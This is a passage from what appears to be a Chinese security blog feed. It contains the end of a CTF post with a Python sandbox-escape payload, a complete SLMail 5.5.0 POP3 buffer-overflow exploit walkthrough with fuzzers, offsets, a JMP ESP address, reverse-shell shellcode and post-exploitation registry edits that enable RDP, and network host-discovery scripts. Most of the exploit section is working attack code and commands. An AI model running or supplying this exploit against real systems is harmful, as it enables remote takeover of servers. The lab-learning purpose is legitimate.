[].__class__.__base__.__subclasses__()[59].__init__.__getattribute__(&#39;func_global&#39; + &#39;s&#39;)[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;popen&#39;](&#39;l&#39;&#39;s /home&#39;).read() 然后我们加上getattribute构造payload： print [].__class__.__base__.__subclasses__()[59].__init__.__getattribute__(&#39;func_global&#39; + &#39;s&#39;)[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;popen&#39;](&#39;c&#39;&#39;at /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb&#39;).read() 总结 利用语言特性来进行解释器的逃逸，其实就是绕过python沙盒内部导入模块的白名单；这里我理解为它限制的是语言中最直接的模块、函数的调用，而我们利用的是通过封装的类，以及派生出的子类调用，实现相同的功能。还有不得不说的一点，结合生产环境，通过内存破坏、溢出等方式实现沙盒的的逃逸要理解很多东西，涉及到二进制、fuzzy等等，所以要通过不断的学习才可以综合的利用。由于水平有限，这里只能做到语言解释器的沙盒逃逸，而不是系统层面的。下面给出一个讲利用内存破坏实现Python沙盒逃逸的链接。]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>CTF</tag>
        <tag>沙盒逃逸</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一次windows缓冲区溢出复现]]></title>
    <url>%2F2018%2F06%2F09%2F%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%2F</url>
    <content type="text"><![CDATA[缓冲区是内存中的一个片段，我们使用程序；在程序中输入一些参数、变量，这些都会先放在缓冲区中，然后通过CPU的调用、处理，然后再由计算机反馈出来。 程序的漏洞从哪里来： 罪恶的根源：变量 数据与代码边界不清（程序没有严格的限定） 由于控制不严会造成程序被严重的破坏 最简单漏洞原理——shell脚本 通过一个最简单的shell脚本来体现漏洞的由来： 这个脚本本意是将用户输入的字符显示出来，从程序的目的来看没有问题 12#！/bin/bashecho $ 但是这个程序没有做数据和命令上的过滤，通过一些特殊字符的构造就可以执行命令（比如； &amp;&amp; ||） 上面的结果就是一个简单的漏洞产生的原理，假如说这是一个服务器，攻击者就可以使用nc开一个监听端口，然后将shell重定向，这样就会直接控制服务器 缓冲区溢出： 当缓冲区边界限制不严格时，由于变量传入畸形数据或程序运行错误，导致缓冲区被“撑爆”，从而覆盖了相邻内存区域的数据。 成功修改内存数据、可以造成进程劫持、执行恶意代码、获得服务器权限等后果。 如何发现漏洞： 源码审计（首先你得能接触到源码） 逆向工程 模糊测试 向程序堆栈发送随机、半随机的数据，根据存在内存变化判断溢出 （完全随机的不好判断） 数据生成器：生成随机、半随机的数据 （工具） 测试工具：识别溢出漏洞 （工具，主要使用一些动态调试工具） Windows缓冲区溢出 FUZZER SLMail 5.5.0 Mail Server （一个Windows下的存在缓冲区溢出的服务端） ImmunityDebugger_1_85setup.exe （一个调试工具，比OD的自动化程度高一些） mona.py （辅助脚本） 环境：Windows XP（需要将SLMail 、调试工具部署好） 安装SLMail按照提示安装完查看端口、服务（smtp、pop3等）是否开放 安装调试工具，如果没有Python2.7环境它会自动安装 将mono.py放在ImmunityDebugger的Pycommands文件夹中 SLMail 5.5.0 Mail Server pop3 pass命令存在缓冲区溢出漏洞 无需身份验证实现远程代码执行 DEP：阻止代码从数据页被执行 （Windows的一种安全防护机制） ASLR：随机内存地址加载执行程序和DLL，每次重启地址变化 （Windows的一种安全防护机制） pop3 最简单的 110端口```123456789101112131415161718192021222324252627282930- 了解未知协议 - wireshark - RFC - 通过一个简单的Python脚本进行110端口的连接： ```python #!/usr/bin/python import socket s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) try: print "\nSending evil buffer..." s.connect(('192.168.111.137',110)) data = s.recv(1024) print data s.send('USER admin' + '\r\n') data = s.recv(1024) print data s.send('PASS admin\r\n') data = s.recv(1024) print data s.close() print "\nDone!" except: print "Could not connect to POP3!" 这里已知SLMail 5.5.0的pass存在缓冲区溢出漏洞，在实际测试用就需要一步步调试 测试pass命令接收到大量数据时是否合法 EIP寄存器存放下一条指令的地址 2.py （通过一个简单的Python脚本来验证SLMail 5.5.0的pass命令存在存在缓冲区漏洞） 123456789101112131415161718192021#!/usr/bin/pythonimport socket buffer = ["A"]counter = 100while len(buffer) &lt;= 50: buffer.append("A"*counter) counter = counter + 200 for string in buffer: print "Fuzzing PASS with %s bytes " % len(string) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect(('192.168.111.137',110)) s.recv(1024) s.send("USER test" + '\r\n') s.recv(1024) s.send('PASS ' + string + '\r\n') s.send('QUIT\r\n') s.close() #向目标的110端口发送大量的A 首先确保开启了pop3： 打开ImmunityDebugger并且开始调试pop3服务的这个进程，查看端口状态的时候可以看到PID是2696 准备就绪以后启动脚本发送数据： 当数据到2700bytes的时候会发现EIP EBP寄存器都是4141 assic码就是A，这个时候发送大量的A造成了PASS指定的溢出，证明溢出确实存在： 溢出存在，如果EIP指令可以修改，就可以通过一些构造，就可能执行一些系统命令；还有一种可能，通过修改EIP的地址，将指令指向一个内存地址空间，通过缓冲区溢出添加shellcode，然后控制服务器。 通过PASS缓冲区溢出漏洞的验证，发现在数据发送到2900bytes的时候溢出 通过第三个脚本精确的找到溢出的四个字节 123456789101112131415#!/usr/bin/pythonimport socket s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)buffer = 'A' * 2700 #因为前面是从2700开始溢出的try: print "\nSending evil buffer..." s.connect(('192.168.111.137',110)) data = s.recv(1024) s.send('USER test' + '\r\n') data = s.recv(1024) s.send('PASS ' + buffer + '\r\n') print "\nDone!"except: print "Could not connect to POP3!" 123456789101112131415#!/usr/bin/pythonimport socket s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)buffer = 'A' * 2600 #改为2800确定是否在 2800-2900之间try: print "\nSending evil buffer..." s.connect(('192.168.111.137',110)) data = s.recv(1024) s.send('USER test' + '\r\n') data = s.recv(1024) s.send('PASS ' + buffer + '\r\n') print "\nDone!"except: print "Could not connect to POP3!" 现在再看POP3的进程，仅管还是溢出了，但是EIP不是全A的状态了，就证明精确溢出的四个字节在2600-2700： 更加精确定位 二分法 唯一字符串法：如果可以生成唯一的字符串，就可以精确定位是那四个字节填充了EIP 通过一个脚本生成 /usr/share/metasploit-framework/tools/exploit/```12345678910111213141516171819202122232425262728293031 ```udo ./pattern_create.rb -l 2700``` ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/17607469.jpg)- 将生成的2700字符串替换上个脚本中的2700个A，然后重新测试，得到如下结果： ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/65730627.jpg)- EIP中的四个字节的HEX为：39 69 44 38 由于计算机中内存的分配和人的阅读习惯刚好相反 ：38 44 69 39；对应的ASSIC为：8Di9- 使用脚本查看着四个字节的偏移量： ```sudo ./pattern_offset.rb -q 39694438``` ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/50197101.jpg)- 然后修改前面的脚本，将偏移量2606的字符串设置为A，然后溢出的四个字节设置为B，其余的设置为C，这样确定精确查找是否正确： ```python #!/usr/bin/python import socket s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) buffer = &apos;A&apos; * 2606 + &apos;B&apos; * 4 + &apos;C&apos; * 80 try: print &quot;\nSending evil buffer...&quot; s.connect((&apos;192.168.111.137&apos;,110)) data = s.recv(1024) s.send(&apos;USER test&apos; + &apos;\r\n&apos;) data = s.recv(1024) s.send(&apos;PASS &apos; + buffer + &apos;\r\n&apos;) print &quot;\nDone!&quot; except: print &quot;Could not connect to POP3!&quot; 通过查看EIP的数据：42424242 刚好是4个B，证明前面测试出的偏移量2606是正确的。这里就可以确定我们可以利用这里的精确修改EIP中的指定达到利用PASS缓冲区溢出的漏洞。 现在已经可以精确修改寄存器中的内容，被修改的寄存器有EIP（重点关注）、EBP、ESP；接下来的思路：将EIP修改为shellcode代码的内存地址，将shellcode写入该地址空间（ESP），程序读取EIP寄存器中的数值，然后跳转到shellcode代码段并执行 寻找可存放shellcode的内存空间 通过脚本来探测ESP寄存器的大小： 123456789101112131415#!/usr/bin/pythonimport socket s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)buffer = 'A' * 2606 + 'B' * 4 + 'C' * 890try: print "\nSending evil buffer..." s.connect(('192.168.111.137',110)) data = s.recv(1024) s.send('USER test' + '\r\n') data = s.recv(1024) s.send('PASS ' + buffer + '\r\n') print "\nDone!"except: print "Could not connect to POP3!"![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/9248235.jpg) 然后查看esp中C的结束地址：（通过计算可以得出esp的空间大小为四百多，可以放下一个shellcode） 由于不同类型的程序、协议、漏洞、会认为一些字符是坏字符，这些字符有固定用途 返回地址、shellcode、buffer都不能出现坏字符 null byte (0x00) 空字符、用于终止字符串的拷贝操作 return （0x0D）回车操作，表示POP3 PASS命令输入完成 思路：发送0x00——0xff 256个字符，查找所有坏字符 123456789101112131415161718192021222324252627282930313233#!/usr/bin/pythonimport socket s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0b\x0c\x0d\x0e\x0f\x00""\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x10""\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x20""\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x30""\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\4e\x4f\x40""\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x50""\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x60""\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x70""\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x80""\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\x90""\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xa0""\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xb0""\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xc0""\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xd0""\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xe0""\xe1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff\xf0")buffer = 'A' * 2606 + 'B' * 4 + badcharstry: print "\nSending evil buffer..." s.connect(('192.168.111.137',110)) data = s.recv(1024) s.send('USER test' + '\r\n') data = s.recv(1024) s.send('PASS ' + buffer + '\r\n') print "\nDone!"except: print "Could not connect to POP3!" 这里我们可以发现ESP寄存器中没有内容了，然后follow in dump 查看具体位置，发现数据一直到0A的时候就异常了，然后修改脚本，删去0A，通过这种方法找到三个坏字符：0A 0D 00 理论上这个时候就可以进行数据的重定项了，将EIP的内容改为ESP的地址，但实际上是ESP的地址是变化的，所以这样就没有办法做重定向，硬编码不可行，这里就需要变通思路： 在内存中寻找地址固定的系统模块 在模块中寻找JMP ESP（内存地址固定不变）指令的地址跳转，再由该指令间接跳转到ESP，从而执行shellcode mono.py脚本识别内存模块，搜索return address 是JMP ESP指令的模块 寻找无DEP、ALSR保护的内存地址 内存地址不含坏字符 配置好调试工具，启动mono脚本：modules```12345678910111213141516 ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/86872565.jpg) 我们可以发现系统正在运行的模块都出现了，那么如何找到合适的模块呢，先介绍一下上面的参数 rebase（操作系统重启以后是否发生变化，如变化，则为true，否则为false）这里寻找false的 safeseh aslr nxcompat 是操作系统的安全机制，都选false,true的是带有保护机制的，内存地址都是随机的。 OS dll表示每个操作系统都有的这里都选为TRUE- 由于计算机内存中存储的是二进制，汇编指令肯定是无法查找的，所以通过工具将汇编指令转换成二进制： ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/17531204.jpg)- 然后我们进行jmp esp的查找，由于调试工具数据是十六进制，所以需要以十六进制的形式进行查找：```! mona find -s &quot;\xff\xe4&quot; -m slmfc.dll 很遗憾，这个模块里面没有，换其他模块，然后就可以找到可利用的：-s "\xff\xe4" -m slmfc.dll```1234567891011121314151617181920212223242526272829303132333435 ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/37554586.jpg)- 然后我们双击第一个模块，然后以汇编指令显示就会发现FFES: jmp esp ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/52427619.jpg)- 在jmp esp指令这里设置断点：（主要是为了利用脚本向跳转的这里发送溢出的代码，验证是否正常可以跳转） ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/8694262.jpg)- 然后我们修改前面精确溢出的代码，溢出的四个字节改为这里设置断点的内存地址，也就是jmp esp ，在添加390个C，也就是说：当程序执行到这jmp esp的时候，跳到ESP寄存器，然后将390个C存入ESP中 - 首先我们可以看到jmp esp的地址为：5F 4A 35 8F ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/38278009.jpg) - 然后我们在脚本里构造溢出的内容为这个地址，由于计算机读取数据和人读是相反的，所以要将地址反过来构造： ```python #!/usr/bin/python import socket s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) buffer = &apos;A&apos; * 2606 + &apos;\x8f\x35\x4a\x5f&apos; + &apos;C&apos; * 390 try: print &quot;\nSending evil buffer...&quot; s.connect((&apos;192.168.111.137&apos;,110)) data = s.recv(1024) s.send(&apos;USER test&apos; + &apos;\r\n&apos;) data = s.recv(1024) s.send(&apos;PASS &apos; + buffer + &apos;\r\n&apos;) print &quot;\nDone!&quot; except: print &quot;Could not connect to POP3!&quot; 然后发送数据，查看EIP和ESP的内容：（发现确实跳转了，EIP的内容为跳转的地址，存储C也是在ESP中执行了，说明我们可以执行shellcode） 按F7执行下一步，发现又跳转到EIP： 现在解决了ESP的地址跳转问题，我们就可以进一步构造shellcode执行，进行系统的控制： 生成shellcode scratch （可以用这个去自己写） 用msfpayload生成shellcode -l``` 查看所有的payload1234567891011121314151617181920212223242526272829303132333435363738394041424344454647 - ```sudo ./msfpayload win32_reverse LHOST=192.168.111.140 LPORT=4444 C``` 用反向连接的这个载荷，C表示的是C语言格式，但是生成以后我们发现存在坏字符，所以shellcode不能使用 - ```sudo ./msfpayload win32_reverse LHOST=192.168.111.140 LPORT=4444 R | ./msfencode -b &quot;\x00\x0a\x0d&quot;``` 这里使用msfemcode对三个字符进行转义，R是保证msfemcode可以使用、 ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/15011544.jpg)- 将shellcode加入代码中： ```python #!/usr/bin/python import socket s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) shellcode = ( &quot;\x6a\x48\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xf7\x71\x2c&quot; + &quot;\xc1\x83\xeb\xfc\xe2\xf4\x0b\x1b\xc7\x8c\x1f\x88\xd3\x3e\x08\x11&quot; + &quot;\xa7\xad\xd3\x55\xa7\x84\xcb\xfa\x50\xc4\x8f\x70\xc3\x4a\xb8\x69&quot; + &quot;\xa7\x9e\xd7\x70\xc7\x88\x7c\x45\xa7\xc0\x19\x40\xec\x58\x5b\xf5&quot; + &quot;\xec\xb5\xf0\xb0\xe6\xcc\xf6\xb3\xc7\x35\xcc\x25\x08\xe9\x82\x94&quot; + &quot;\xa7\x9e\xd3\x70\xc7\xa7\x7c\x7d\x67\x4a\xa8\x6d\x2d\x2a\xf4\x5d&quot; + &quot;\xa7\x48\x9b\x55\x30\xa0\x34\x40\xf7\xa5\x7c\x32\x1c\x4a\xb7\x7d&quot; + &quot;\xa7\xb1\xeb\xdc\xa7\x81\xff\x2f\x44\x4f\xb9\x7f\xc0\x91\x08\xa7&quot; + &quot;\x4a\x92\x91\x19\x1f\xf3\x9f\x06\x5f\xf3\xa8\x25\xd3\x11\x9f\xba&quot; + &quot;\xc1\x3d\xcc\x21\xd3\x17\xa8\xf8\xc9\xa7\x76\x9c\x24\xc3\xa2\x1b&quot; + &quot;\x2e\x3e\x27\x19\xf5\xc8\x02\xdc\x7b\x3e\x21\x22\x7f\x92\xa4\x32&quot; + &quot;\x7f\x82\xa4\x8e\xfc\xa9\x37\xd9\x43\x4d\x91\x19\x3d\x9d\x91\x22&quot; + &quot;\xa5\x20\x62\x19\xc0\x38\x5d\x11\x7b\x3e\x21\x1b\x3c\x90\xa2\x8e&quot; + &quot;\xfc\xa7\x9d\x15\x4a\xa9\x94\x1c\x46\x91\xae\x58\xe0\x48\x10\x1b&quot; + &quot;\x68\x48\x15\x40\xec\x32\x5d\xe4\xa5\x3c\x09\x33\x01\x3f\xb5\x5d&quot; + &quot;\xa1\xbb\xcf\xda\x87\x6a\x9f\x03\xd2\x72\xe1\x8e\x59\xe9\x08\xa7&quot; + &quot;\x77\x96\xa5\x20\x7d\x90\x9d\x70\x7d\x90\xa2\x20\xd3\x11\x9f\xdc&quot; + &quot;\xf5\xc4\x39\x22\xd3\x17\x9d\x8e\xd3\xf6\x08\xa1\x44\x26\x8e\xb7&quot; + &quot;\x55\x3e\x82\x75\xd3\x17\x08\x06\xd0\x3e\x27\x19\xdc\x4b\xf3\x2e&quot; + &quot;\x7f\x3e\x21\x8e\xfc\xc1&quot;) buffer = &apos;A&apos; * 2606 + &apos;\x8f\x35\x4a\x5f&apos; + &apos;\x90&apos; * 8 +shellcode try: #\x90表示的是汇编中的nop，就是不执行操作，保证shellcode的可用性，为了防止esp执行的时候把我的shellcode的前面几个字符忽略掉 print &quot;\nSending evil buffer...&quot; s.connect((&apos;192.168.111.137&apos;,110)) data = s.recv(1024) s.send(&apos;USER test&apos; + &apos;\r\n&apos;) data = s.recv(1024) s.send(&apos;PASS &apos; + buffer + &apos;\r\n&apos;) print &quot;\nDone!&quot; except: print &quot;Could not connect to POP3!&quot; 现在我们监听本地的4444端口，等待反向连接 nc -vlp 4444```1234567891011121314151617181920212223- 然后保证SLmail服务正常运行，发送数据，然后缓冲区溢出利用成功，拿到系统权限： ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/34848509.jpg) - 执行系统命令： ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/21092299.jpg) - 觉得命令行不舒服：改注册表，然后3389远程连接： - ```tex echo Windows Registry Editor Version 5.00&gt;3389.reg echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]&gt;&gt;3389.reg echo &quot;fDenyTSConnections&quot;=dword:00000000&gt;&gt;3389.reg C:\&gt;echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp]&gt;&gt;3389.reg echo [HKEY_LOCAL_MACHINE\SYSTEM Server\Wds\rdpwd\Tds\tcp]&gt;&gt;3389.reg C:\&gt;echo &quot;PortNumber&quot;=dword:00000d3d&gt;&gt;3389.reg echo &quot;PortNumber&quot;=dword:00000d3d&gt;&gt;3389.reg C:\&gt;echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]&gt;&gt;3389.reg echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]&gt;&gt;3389.reg echo &quot;PortNumber&quot;=dword:00000d3d&gt;&gt;3389.reg regedit /s 3389.reg rdesktop 192.168.111.137 远程桌面连接。]]></content>
      <categories>
        <category>fuzzy</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>fuzzy</tag>
        <tag>缓冲区溢出</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[主动信息收集——三层发现]]></title>
    <url>%2F2018%2F06%2F05%2F%E5%9F%BA%E4%BA%8ETCP-IP%E7%9A%84%E4%B8%89%E5%B1%82%E5%8F%91%E7%8E%B0.md%2F</url>
    <content type="text"><![CDATA[三层发现的优点 可路由 速度快 缺点 速度比二层慢 经常被边界防火墙过滤(还有可能出现宕机状态） IP、ICMP、TCP协议 ping 使用ping命令的时候如果可以接发包，使用的是数据包的type8，如果不可以使用的是type0 ping -192.168.0.102 -c 5 在这里linux和Windows的ping包有些不同，使用-c 可以指定发送多少个数据包 进行三层的发现除了进行icmp的探测之外还可以用路由追踪 使用路由追踪命令可能会被边界路由拦截，但是路由追踪和ping有点不同，它先会将TTL值设置为1，在经过第一跳路由以后减一，这个时候就会发送数据包12345678910111213141516171819- 使用traceroute和ping -R命令有点不同，使用traceroute返回的是较近的网卡，而使用ping -R返回的是较远的网卡- ```ping 192.168.1.103 -c 1 | grep &quot;bytes from&quot; | cut -d &quot; &quot; -f 4 | cut -d &quot;:&quot; -f 1``` 这样使用管道就可以将存在的ip显示出来- 由于ping命令本身不支持一个网段的并发性扫描，所以通过脚本来实现，三层的发现简单bash脚本： ```bash #/bin/bash if [ &quot;$#&quot; -ne 1 ]; then echo &quot;Usage - ./ping.sh [interface]&quot; echo &quot;Example - ./ping.sh 192.168.1.0&quot; echo &quot;Example will perform an ICMP&quot; exit fi prefix=$(echo $1 | cut -d &apos;.&apos; -f 1-3) for addr in $(seq 1 254); do ping -c 1 $prefix.$addr | grep &quot;bytes from&quot; | cut -d &quot; &quot; -f 4 | cut -d &quot;:&quot; -f 1 &gt;&gt; addr.txt done 除了使用bash调用ping命令之外，还可以使用scopy类似于二层发现时的脚本来进行主机发现，使用scopy的时候一定要设置超时，脚本如下： 12345678910111213141516171819import loggingimport subprocesslogging.getLogger("scapy.runtime").setLevel(logging.ERROR)from scapy.all import * if len(sys.argv) != 2: print "Usage - ./pingr 0/24 ICMP" print "Example - ./pingr 192.168.0.103" print "Example will perform an ICMP scan of the 192.168.0.0/24 range" sys.exit()address = str(sys.argv[1])prefix = address.split('.')[0] + '.' + address.split('.')[1] + '.' + address.split('.')[2] + '.' for addr in range(1,254): answer=sr1(IP(dst=prefix+str(addr))/ICMP(),timeout=0.1,verbose=0) if answer == None: pass else: print prefix+str(addr) 使用脚本也可以调用已经存在的IP列表进行扫描，这样将脚本改为加载ip文件，然后调用扫描就可以了 除了使用ping和traceroute之外还可以使用nmap进行三层的发现： 192.168.1.103 -sn``` nmap 使用-sn的时候如果是在本网段的网络会发送arp包，如果不是在本网段会发送icmp的数据包，但由于nmap使用了大量不同的技术手段去探测目标，所以还会发送tcp的数据包。12343. fping :比ping的命令强大一点 - ```fping 192.168.1.103 -c 10 -g 192.168.1.1 192.168.1.103 -c 10``` fping 与ping命令不同的是将一个ip段进行扫描，也可以使用0/24扫描，只显示ip的话可以使用管道进行分割12345678910111213 - ```fping -f iplist.txt``` 调用ip列表文件4. hping : - 能发送几乎任意TCO/IP的数据包，在一定程度上可以进行压力测试 - 功能强大，但每次只能扫描一个目标 - ```hping3 192.168.1.103 --icmp -c 2``` 也可以进行三层扫描 - 也可以使用一行的方式实现一个ip段的扫描，因为显示的内容太多，所以将扫描结果保存到一个TXT文件中 ```for addr in $(seq 1 254);do hping3 192.168.1.$addr --icmp -c 1 &gt;&gt; hping.txt &amp; done]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>parrot</tag>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[主动信息收集]]></title>
    <url>%2F2018%2F06%2F05%2F%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%E4%BA%8C%E5%B1%82%E5%8F%91%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[被动收集的信息可能不是最新的信息，通过主动的手段去发现更精确的信息 直接与目标系统交互通信 无法避免留下访问的痕迹（如果目标系统有完善的系统日志） 使用受控的第三方电脑进行探测 使用代理或已经被控制的主机 做好本封杀的准备 使用噪声迷惑目标，淹没真实的探测流量 扫描 发送不同的探测，根据返回结果判断目标状态（ip，端口，服务） 发现 识别活着的主机 潜在的被攻击目标 输出一个ip地址列表 2，3，4层发现 发现——二层发现 优点：扫描速度快，可靠 缺点：不可路由，只能发现本网段 ARP协议 抓包 arping:(二层中单个存活主机的探测) arping 192.168.0.1 -c 1``` -c是指定发送一个包以后看是否存在，否则会一直发包；如果不在一个网络里，发包的话是不存在的12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182 - ```sudo arping 192.168.0.1 -d``` -d是同一个ip拥有不同的Mac地址，就是说，如果结果显示有两个Mac地址声称自己是网关，那么你的网络就存在arp欺骗，然后根据路由器查arp表进行定位 - ```sudo arping 192.168.0.1 -c 1 | grep &quot;bytes from&quot; | cut -d&quot; &quot; -f 5 |cut -d &quot;(&quot; -f 2 | cut -d&quot;)&quot; -f 1``` 通过管道显示活着的主机 - 但是这样只能扫描一个ip，不能自动化的去扫描一个网段，所以用脚本去实现：扫描的时候可以指定网卡，这里用bash脚本来实现这个功能```sudo ./arping1.sh eth0 &gt; addr.txt``` ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-2-9/12275742.jpg) - 第二个脚本：这个脚本的功能是去探测已知ip列表的主机是否存活的脚本，前提是要有一个ip列表的文件```sudo ./arping2.sh addr.txt``` ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-2-9/77751631.jpg) - 如果要在扫描的时候直接将结果重定向到一个文本文件中，直接早bash脚本中添加即可2. 二层发现——nmap: - ```nmap -sn 192.168.0.1/24``` 扫描速度更快，显示的信息更多 - &gt; Nmap scan report for 192.168.0.1 &gt; Host is up (0.020s latency). &gt; Nmap scan report for 192.168.0.101 &gt; Host is up (0.0011s latency). &gt; Nmap scan report for 192.168.0.104 &gt; Host is up (0.084s latency). &gt; Nmap scan report for 192.168.0.107 &gt; Host is up (0.00059s latency). &gt; Nmap done: 256 IP addresses (4 hosts up) scanned in 5.65 seconds - ```nmap -iL filename -sn``` 这个可以做和arping第二个脚本一样的工作 &gt; -sn 参数不做端口扫描，但它不仅仅发ARP记录，还会DNS做ptr反向域名解析的解析3. 二层发现———Netdiscover - 专用与二层发现 - 可用于无线和交换网络环境 - 主动和被动扫描 - 主动 - netdiscover -i eth0 -r 192.168.0.1/24![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-2-9/71668956.jpg) - netdiscover -l iplist.txt - 被动 - netdiscover -p （开启混杂模式）只要在在网卡上有arp包数据，就可以侦听到：![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-2-9/18073354.jpg) - 主动arp容易触发预警4. 二层发现———Scapy - scapy - 作为Python的库文件进行调用 - 也可以做单独的工具使用 - 抓包，分析，创建，修改，注入网络流量 - apt-get install python-gnuplot - 输入scapy启动scapy启动，然后输入ARP()调用这个函数，```ARP().display()查询ARP函数的属性``` ，这样就可以定制（arp的报头结构，将函数的属性字段添加进去，这样就可以实现一个arp查询）![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-2-9/83165222.jpg) - 直接利用scapy进行arp探测，实际上就是通过调用scapy自带的函数进行查询： - 首先```sudo scapy``` 启动进行scapy命令行模式下 - 通过```ARP().display()``` 可以查看APR这个函数下的函数头，然后这只pdst这个要查询的目标```arp.pdst=&quot;192.168.0.1&quot;``` 这里的arp是设置的变量 - 通过```sr1(arp)``` 进行发包然后查看回显：这里也可以设置一个anwser变量带代替返回的数据包，然后调用display方法查看数据包的返回情况（有一个问题，如果查询的是一个不存在的ip，这样会一直发包，所以要加上timeout，加上一个verbose=1，显示详细的信息）![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-2-9/81052649.jpg) - scapy是Python的库，所以也支持Python脚本来进行探测，可以调用这个库来写脚本进行arp扫描，前面用的是shell脚本```sudo ./arp_disc.py eth0``` 用脚本的话要慢，首先这里设计的脚本不是多线程，其次还要判断超时的时间，当然为了准确性，scarp默认发两个数据包 &gt; ```python &gt; #!/usr/bin/python &gt; &gt; import logging &gt; import subprocess &gt; logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR) &gt; from scapy.all import * &gt; &gt; if len(sys.argv) != 2: &gt; print &quot;Usage - ./arp_disc.py [interface]&quot; &gt; print &quot;Example - ./ar_disc.py eth0&quot; &gt; print &quot;Example will perform an ARP scan of the local subnet to which eth0 is assigned&quot; &gt; sys.exit() &gt; &gt; interface = str(sys.argv[1]) &gt; &gt; ip = subprocess.check_output(&quot;ifconfig&quot; + interface + &quot; | grep &apos;inet&apos; | cut -d&apos;.&apos; -f 1-3 | cut -d&quot; &quot; -f 10 | cut -d &apos;f&apos; -f 1 &quot;,shell = True).strip() &gt; &gt; prefix = ip.split(&apos;.&apos;)[0] + &apos;.&apos; + ip.split(&apos;.&apos;)[1] + &apos;.&apos; +ip.split(&apos;.&apos;)[2] + &apos;.&apos; &gt; &gt; for addr in range(1,254): &gt; answer = sr1(ARP(pdst=prefix+str(addr)),timeout = 1,verbose = 0) &gt; if answer == None: &gt; pass &gt; else: &gt; print prefix + str(addr) &gt; 第二个脚本，这个脚本和arping的第二个脚本类似，都是可以调用已知的ip列表文件进行二层的发现：./arp_disc.py ip_list.txt``` 脚本代码如下：1234567891011121314151617181920212223242526&gt; ```python&gt; #!/usr/bin/python&gt; #-*- coding:utf-8 -*-&gt; &gt; import logging&gt; import subprocess&gt; 